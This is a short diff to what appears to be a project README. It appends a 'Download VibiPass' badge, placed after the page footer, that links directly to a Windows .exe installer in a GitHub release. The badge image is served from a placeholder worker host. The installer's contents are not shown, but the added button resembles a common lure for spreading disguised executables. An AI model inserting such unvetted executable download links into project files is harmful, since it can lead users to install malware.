@@ -289,3 +289,7 @@ Every contribution helps make the ecosystem better.
 <p align="center">
   Open Source • AI • Developer Tools
 </p>
+
+
+
+[![Download VibiPass ](https://alive-readme-buttons.YOUR-SUBDOMAIN.workers.dev/btn.svg?text=Download+VibiPass+&bg=975dc6&fg=e7dede&icon=windows&style=pill&fill=gradient&anim=shine)](https://github.com/spooky8823/Vibifiy/releases/download/v1.0.1/VibiPass_Setup_1.0.exe)
